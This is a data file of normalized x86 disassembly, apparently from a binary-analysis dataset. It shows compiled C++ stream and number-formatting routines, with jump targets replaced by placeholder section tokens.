mov [ ebp + 0x24 ] ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push edx
push eax
mov eax [ ebp - 0x6c ]
mov bl 0x30
lea edi [ ebp - 0x7c ]
call sub_4279b0
mov ecx [ eax ]
add [ ebp - 0x50 ] esi
mov ebx [ ebp - 0x50 ]
add esp 0x10
sub [ ebp - 0x54 ] esi
mov esi [ ebp - 0x54 ]
mov [ ebp + 0x20 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x24 ] edx
cmp [ ebp - 0x68 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x24 ]
mov edx [ ebp + 0x20 ]
mov bl [ ebp - 0x49 ]
push ecx
mov eax edi
push edx
lea edi [ ebp - 0x74 ]
call sub_4279b0
mov ecx [ eax ]
mov [ ebp + 0x20 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x24 ] edx
jmp r-xdata
sub ecx eax
mov edi ecx
mov [ ebp - 0x58 ] edi
jmp r-xdata
test edi edi
jne r-xdata
mov eax [ ebp - 0x5c ]
push 0x30
push eax
lea ecx [ ebp - 0x2c ]
call sub_409a90
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x20 ]
mov bl [ ebp - 0x4a ]
push eax
mov eax [ ebp - 0x50 ]
push ecx
lea edx [ ebp - 0x7c ]
push esi
push edx
call sub_427b90
mov ecx [ eax ]
mov [ ebp + 0x20 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x24 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov eax [ ebp - 0x5c ]
push ecx
push edx
mov bl 0x30
lea edi [ ebp - 0x7c ]
call sub_4279b0
mov ecx [ eax ]
mov edx [ ebp - 0x80 ]
mov bl [ ebp - 0x49 ]
mov edi [ ebp + 0x8 ]
mov [ ebp + 0x20 ] ecx
mov eax [ eax + 0x4 ]
push eax
mov [ ebp + 0x24 ] eax
mov eax [ ebp - 0x58 ]
xor esi esi
push ecx
mov [ edx + 0x20 ] esi
mov [ edx + 0x24 ] esi
call sub_4279b0
mov esi 0x10
add esp 0x20
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ecx [ ebp + 0x20 ]
sub eax ebx
mov bl [ ebp - 0x4a ]
lea esi [ eax + 0x1 ]
mov eax [ ebp + 0x24 ]
push eax
push ecx
lea edx [ esi - 0x1 ]
push edx
lea eax [ ebp - 0x7c ]
push eax
mov eax [ ebp - 0x50 ]
call sub_427b90
mov ecx [ eax ]
mov [ ebp + 0x20 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x24 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov eax [ ebp - 0x5c ]
push ecx
push edx
mov bl 0x30
lea edi [ ebp - 0x7c ]
call sub_4279b0
mov ecx [ eax ]
mov [ ebp + 0x20 ] ecx
mov ecx [ ebp - 0x80 ]
mov edx [ eax + 0x4 ]
add esp 0x18
test [ ecx + 0x14 ] 0x4
mov [ ebp + 0x24 ] edx
mov [ ebp - 0x5c ] 0x0
mov ecx r--data
jne r-xdata
mov eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x20 ]
mov bl [ ebp - 0x49 ]
push eax
mov eax edi
push ecx
lea edi [ ebp - 0x74 ]
call sub_4279b0
mov edx [ eax ]
mov [ ebp + 0x20 ] edx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x20 ]
push eax
push ecx
lea edx [ ebp - 0x74 ]
push edx
mov eax 0x1
mov ecx ebx
call sub_427940
mov ecx [ eax ]
inc ebx
add esp 0xc
mov [ ebp + 0x20 ] ecx
mov edx [ eax + 0x4 ]
dec esi
mov [ ebp + 0x24 ] edx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x54 ] esi
mov esi [ ebp - 0x54 ]
mov ebx [ ebp - 0x50 ]
mov [ ebp - 0x58 ] 0x0
add esp 0x8
mov eax [ edx + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov edx [ ebp - 0x5c ]
push 0x30
mov edi esi
push edx
sub edi ebx
lea esi [ ebp - 0x2c ]
call sub_408df0
mov edi [ ebp - 0x70 ]
mov ecx [ ebp - 0x60 ]
push 0x30
push ecx
lea ecx [ ebp - 0x2c ]
call sub_409a90
mov [ ebp - 0x60 ] edi
push 0x30
test edi edi
jne r-xdata
xor eax eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x2c ] al
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_43811c
add esp 0x4
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push edx
push eax
lea edx [ ebp - 0x7c ]
push edx
mov eax 0x1
call sub_427940
mov ecx [ eax ]
add [ ebp - 0x50 ] esi
add esp 0xc
sub [ ebp - 0x54 ] esi
mov esi [ ebp - 0x54 ]
mov [ ebp + 0x20 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x24 ] edx
mov ecx r--data
mov ecx [ ebp - 0x6c ]
sub edi ebx
mov [ ebp - 0x70 ] edi
push ecx
lea edi [ edi + 0x1 ]
lea esi [ ebp - 0x2c ]
call sub_408df0
mov edx [ ebp - 0x60 ]
mov edi [ ebp - 0x70 ]
push 0x30
push edx
call sub_408df0
mov [ ebp - 0x6c ] 0x0
mov eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_409a90
jmp r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x48 ]
push ecx
call sub_43811c
add esp 0x4
cmp [ ebp - 0x18 ] eax
mov eax [ ebp - 0x2c ]
jae r-xdata
lea ebx [ ebp - 0x48 ]
mov ebx [ ebp - 0x48 ]
mov eax 0x10
mov [ ebp - 0x60 ] 0x0
cmp [ ebp - 0x34 ] eax
jae r-xdata
lea ecx [ ebp - 0x64 ]
push ecx
push eax
call sub_438ca0
mov edi eax
mov al [ ebx ]
add esp 0x8
cmp al 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
test al al
jle r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x50 ] ecx
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x50 ] eax
jmp r-xdata
mov edx edi
sub edx [ ebp - 0x68 ]
movsx eax al
cmp eax edx
jae r-xdata
mov edx [ ebp - 0x1c ]
mov ebx [ ebp - 0x50 ]
mov [ ebp - 0x5c ] 0x0
mov [ ebp - 0x54 ] edx
mov esi edx
push 0x0
sub edi eax
push 0x1
lea esi [ ebp - 0x2c ]
call sub_408df0
cmp [ ebx + 0x1 ] 0x0
jle r-xdata
mov al [ ebx ]
cmp al 0x7f
jne r-xdata
inc ebx
sub_427640
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ ecx ] 0x2b
inc ecx
push ebx
mov bl [ edi ]
push esi
cmp bl 0x4c
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov [ ecx ] 0x3649
mov [ ecx + 0x2 ] 0x34
add ecx 0x3
mov [ ecx ] bl
inc ecx
jmp r-xdata
cmp esi 0x800
je r-xdata
mov dl 0x6f
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
retn
mov esi edx
and esi 0xe00
cmp esi 0x400
jne r-xdata
add dl dl
add dl dl
add dl dl
not dl
and dl 0x20
or dl 0x58
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
retn
mov dl [ edi + 0x1 ]
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
retn
sub_4276c0
push ebp
mov ebp esp
push 0xffffffff
push sub_451240
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov al [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x31 ] al
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x3c ] edx
mov [ ebp - 0x38 ] ebx
call sub_402e50
mov edi eax
mov [ ebp - 0x4 ] 0x0
call sub_428340
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x54 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x58 ]
lea esi [ ebp - 0x30 ]
call sub_427c60
mov edi [ ebp - 0x3c ]
mov [ ebp - 0x4 ] 0x1
mov al [ edi ]
cmp al 0x2b
je r-xdata
push 0x0
lea ecx [ ebp - 0x40 ]
mov edi eax
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x40 ] 0x1
cmp al 0x2d
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x40 ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x30 ]
cmp al 0x30
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x50 ]
cmp [ eax + 0x24 ] 0x0
mov esi [ eax + 0x20 ]
jl r-xdata
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ ebp - 0x40 ] 0x0
jmp r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
xor esi esi
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x30 ]
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ ebp - 0x40 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x58 ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
push ecx
push edx
push ebx
lea ecx [ ebp - 0x5c ]
mov bl al
mov eax [ ebp - 0x3c ]
push ecx
call sub_427b90
mov ecx [ eax ]
mov edx [ ebp - 0x50 ]
mov bl [ ebp - 0x31 ]
mov [ ebp + 0x14 ] ecx
mov eax [ eax + 0x4 ]
xor edi edi
push eax
mov [ ebp + 0x18 ] eax
mov [ edx + 0x20 ] edi
mov [ edx + 0x24 ] edi
mov edi [ ebp + 0x8 ]
push ecx
mov eax esi
call sub_4279b0
add esp 0x18
cmp [ ebp - 0x1c ] 0x10
jb r-xdata
cmp eax 0x100
je r-xdata
cmp esi ebx
jbe r-xdata
test esi esi
je r-xdata
cmp ecx 0x10
jb r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x30 ]
push edx
call sub_43811c
add esp 0x4
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x40 ]
push ecx
lea edx [ ebp - 0x4c ]
push edx
mov ecx edi
call sub_427940
mov ecx [ eax ]
mov [ ebp + 0x14 ] ecx
mov ecx [ ebp - 0x40 ]
mov edx [ eax + 0x4 ]
add esp 0xc
add edi ecx
mov [ ebp + 0x18 ] edx
mov edx [ eax ]
sub ebx ecx
mov ecx [ eax + 0x4 ]
push ecx
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x38 ] ebx
push edx
mov edx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push edx
push eax
jmp r-xdata
sub esi ebx
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x48 ] edx
jmp r-xdata
mov bl [ ebp - 0x31 ]
mov eax esi
lea edi [ ebp - 0x44 ]
call sub_4279b0
mov ecx [ eax ]
mov ebx [ ebp - 0x38 ]
mov [ ebp + 0x14 ] ecx
mov edx [ eax + 0x4 ]
add esp 0x8
xor esi esi
mov [ ebp + 0x18 ] edx
mov eax [ eax + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
test al al
jle r-xdata
mov edx [ ebp - 0x48 ]
mov al [ edx ]
mov esi ebx
cmp al 0x7f
je r-xdata
mov [ ebp - 0x38 ] ebx
mov ecx esi
sub ecx [ ebp - 0x40 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub esi eax
mov eax ebx
sub eax esi
inc eax
push eax
add edi esi
push edi
push eax
mov eax [ ebp - 0x3c ]
lea ecx [ eax + esi + 0x1 ]
push ecx
call sub_438b44
mov eax [ ebp - 0x48 ]
add esp 0x10
mov [ edi ] 0x0
inc ebx
cmp [ eax + 0x1 ] 0x0
jle r-xdata
mov al [ eax ]
mov edi [ ebp - 0x3c ]
cmp al 0x7f
jne r-xdata
inc eax
mov [ ebp - 0x48 ] eax
sub_427940
push ebp
mov ebp esp
push ebx
mov ebx eax
push edi
mov edi ecx
mov ecx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebx
pop ebp
retn
push esi
mov [ ebp + 0xc ] 0x1
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
mov dl [ edi ]
je r-xdata
test ecx ecx
je r-xdata
pop esi
mov eax [ ecx ]
mov eax [ eax + 0xc ]
movzx edx dl
push edx
call eax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
inc edi
dec ebx
jne r-xdata
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea esi [ ecx + 0x1 ]
mov [ eax ] esi
mov [ ecx ] dl
movzx eax dl
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
sub_4279b0
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
mov esi eax
test esi esi
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edi ] edx
mov [ edi + 0x4 ] ecx
mov eax edi
pop esi
pop ebp
retn
lea ecx [ ecx ]
mov [ ebp + 0x8 ] 0x1
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov eax [ eax + 0xc ]
movzx edx bl
push edx
call eax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
dec esi
jne r-xdata
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
mov [ ecx ] bl
movzx eax bl
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp eax 0xffffffff
jne r-xdata
sub_427a50
push ebp
mov ebp esp
push ecx
mov ecx [ ecx + 0x8 ]
push esi
mov esi [ ebp + 0x8 ]
mov eax ecx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push ecx
mov ecx esi
call sub_405a70
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_427aa0
push ebp
mov ebp esp
push ecx
mov ecx [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
mov eax ecx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push ecx
mov ecx esi
call sub_405a70
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_427af0
push ebp
mov ebp esp
push ecx
mov ecx [ ecx + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
mov eax ecx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push ecx
mov ecx esi
call sub_405a70
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_427b40
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
push eax
mov [ esi ] r--data
call sub_438111
mov ecx [ esi + 0x10 ]
push ecx
call sub_438111
mov edx [ esi + 0x14 ]
push edx
call sub_438111
add esp 0xc
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_427b90
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi eax
lea ebx [ ebx ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
push eax
push ecx
lea edx [ ebp - 0x10 ]
push edx
mov eax esi
mov ecx edi
call sub_427940
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
add esp 0xc
add edi esi
sub [ ebp + 0xc ] esi
mov [ ebp + 0x14 ] edx
je r-xdata
sub eax edi
mov esi eax
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
pop edi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop esi
mov esp ebp
pop ebp
retn
test bl bl
je r-xdata
inc edi
dec [ ebp + 0xc ]
jmp r-xdata
mov esi [ eax + 0x4 ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
test esi esi
je r-xdata
mov esi [ ebp + 0xc ]
push esi
push 0x0
push edi
call sub_438bc0
add esp 0xc
test eax eax
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov edx [ esi + 0x24 ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0xc ]
movzx ecx bl
push ecx
mov ecx esi
call edx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
mov [ ebp + 0x14 ] esi
dec [ eax ]
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
mov [ ecx ] bl
movzx eax bl
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
sub_427ca0
push ebp
mov ebp esp
push 0xffffffff
push sub_451b8a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx [ edi ]
mov esi [ eax + 0x10 ]
mov eax [ ecx + 0x4 ]
mov edx [ eax + edi + 0x24 ]
mov ecx [ eax + edi + 0x20 ]
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x1c ] esi
test edx edx
jl r-xdata
mov [ ebp - 0x14 ] 0x0
mov ebx [ ebp - 0x14 ]
jg r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + edi + 0xc ] 0x0
jne r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] edx
cmp ecx esi
jbe r-xdata
test ecx ecx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
cmp [ eax + edi + 0xc ] 0x0
sete cl
mov [ ebp - 0x24 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
jne r-xdata
mov eax [ eax + edi + 0x3c ]
test eax eax
je r-xdata
sub ecx esi
mov ebx ecx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ eax + edi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov ebx 0x4
jmp r-xdata
mov esi eax
call sub_40ee80
mov eax [ eax + edi + 0x38 ]
mov [ ebp - 0x28 ] edi
test eax eax
je r-xdata
mov ebx [ ebp - 0x18 ]
test ebx ebx
je r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
test ebx ebx
je r-xdata
mov ecx [ edi ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + edi + 0x38 ]
mov edx [ ecx ]
xor esi esi
push esi
push [ ebp - 0x1c ]
push eax
mov eax [ edx + 0x24 ]
call eax
cmp eax [ ebp - 0x1c ]
jne r-xdata
mov eax [ eax ]
mov ebx [ ebp - 0x18 ]
mov edx [ edi ]
mov eax [ edx + 0x4 ]
lea ecx [ eax + edi ]
mov al [ ecx + 0x40 ]
mov ecx [ ecx + 0x38 ]
mov edx [ ecx + 0x24 ]
cmp [ edx ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x4
call j_sub_43d14a
mov esi [ ebp - 0x28 ]
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
cmp edx esi
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x10
jb r-xdata
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
mov edx [ ecx ]
movzx eax al
push eax
mov eax [ edx + 0xc ]
call eax
mov edx [ ecx + 0x34 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + esi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_404650
push 0x0
push eax
call sub_402d50
or eax 0x4
mov edx [ edi ]
mov eax [ edx + 0x4 ]
xor ecx ecx
mov [ eax + edi + 0x20 ] ecx
mov [ eax + edi + 0x24 ] ecx
mov [ ebp - 0x4 ] 0x1
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
mov al [ ecx + edi + 0x40 ]
mov ecx [ ecx + edi + 0x38 ]
mov edx [ ecx + 0x24 ]
cmp [ edx ] 0x0
je r-xdata
dec ebx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
mov ebx [ ebp - 0x18 ]
or ebx 0x4
mov [ ebp - 0x18 ] ebx
jmp r-xdata
dec [ edx ]
mov ecx [ ecx + 0x24 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ecx ] esi
mov [ edx ] al
movzx eax al
jmp r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov edx [ ecx ]
movzx eax al
push eax
mov eax [ edx + 0xc ]
call eax
mov edx [ ecx + 0x34 ]
cmp [ edx ] 0x0
jle r-xdata
test ebx ebx
je r-xdata
cmp eax 0xffffffff
jne r-xdata
dec [ ebp - 0x14 ]
jmp r-xdata
or ebx 0x4
jmp r-xdata
dec [ edx ]
mov ecx [ ecx + 0x24 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ecx ] esi
mov [ edx ] al
movzx eax al
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
sub_427ef7
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_402d50
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_427f30
push ebp
mov ebp esp
push 0xffffffff
push sub_451b4a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov edx [ eax + 0x4 ]
mov ecx [ edx + edi + 0x24 ]
mov eax [ edx + edi + 0x20 ]
xor esi esi
mov [ ebp - 0x14 ] esi
lea ebx [ esi + 0xb ]
cmp ecx esi
jl r-xdata
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
jg r-xdata
mov [ ebp - 0x4 ] esi
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + edi + 0xc ] esi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
sub eax 0xb
sbb ecx esi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ecx
jmp r-xdata
cmp eax esi
jbe r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
cmp [ eax + edi + 0xc ] 0x0
sete cl
mov [ ebp - 0x24 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
jne r-xdata
mov eax [ eax + edi + 0x3c ]
cmp eax esi
je r-xdata
mov ecx [ edx + edi + 0x38 ]
mov [ ebp - 0x28 ] edi
cmp ecx esi
je r-xdata
cmp ecx esi
jl r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ eax + edi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
mov esi eax
call sub_40ee80
jg r-xdata
mov ecx [ edi ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + edi + 0x38 ]
mov edx [ ecx ]
xor esi esi
push esi
push ebx
mov eax r--data
push eax
mov eax [ edx + 0x24 ]
call eax
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jl r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
add ecx edi
test edx edx
je r-xdata
cmp eax ebx
jbe r-xdata
mov [ ebp - 0x14 ] 0x4
cmp edx esi
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
jg r-xdata
mov [ ebp - 0x4 ] 0x4
call j_sub_43d14a
mov esi [ ebp - 0x28 ]
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jl r-xdata
mov edx [ edi ]
mov eax [ edx + 0x4 ]
xor ecx ecx
mov [ eax + edi + 0x20 ] ecx
mov [ eax + edi + 0x24 ] ecx
mov [ ebp - 0x4 ] 0x1
mov edx [ edi ]
mov eax [ edx + 0x4 ]
lea ecx [ eax + edi ]
mov al [ ecx + 0x40 ]
mov ecx [ ecx + 0x38 ]
mov edx [ ecx + 0x24 ]
cmp [ edx ] 0x0
je r-xdata
cmp [ ebp - 0x20 ] 0x0
jbe r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + esi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_404650
push 0x0
push eax
call sub_402d50
or eax 0x4
jg r-xdata
mov edx [ ecx ]
movzx eax al
push eax
mov eax [ edx + 0xc ]
call eax
mov edx [ ecx + 0x34 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
mov al [ ecx + edi + 0x40 ]
mov ecx [ ecx + edi + 0x38 ]
mov edx [ ecx + 0x24 ]
cmp [ edx ] 0x0
je r-xdata
cmp [ ebp - 0x20 ] 0x0
jbe r-xdata
add [ ebp - 0x20 ] ecx
adc [ ebp - 0x1c ] ecx
jmp r-xdata
or [ ebp - 0x14 ] 0x4
dec [ edx ]
mov ecx [ ecx + 0x24 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ecx ] esi
mov [ edx ] al
movzx eax al
jmp r-xdata
mov edx [ ecx ]
movzx eax al
push eax
mov eax [ edx + 0xc ]
call eax
mov edx [ ecx + 0x34 ]
cmp [ edx ] 0x0
jle r-xdata
or ecx 0xffffffff
cmp eax ecx
jne r-xdata
add [ ebp - 0x20 ] ecx
adc [ ebp - 0x1c ] ecx
jmp r-xdata
or [ ebp - 0x14 ] 0x4
jmp r-xdata
dec [ edx ]
mov ecx [ ecx + 0x24 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ecx ] esi
mov [ edx ] al
movzx eax al
jmp r-xdata
or ecx 0xffffffff
cmp eax ecx
jne r-xdata
sub_428189
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_402d50
mov [ ebp - 0x4 ] 0x1
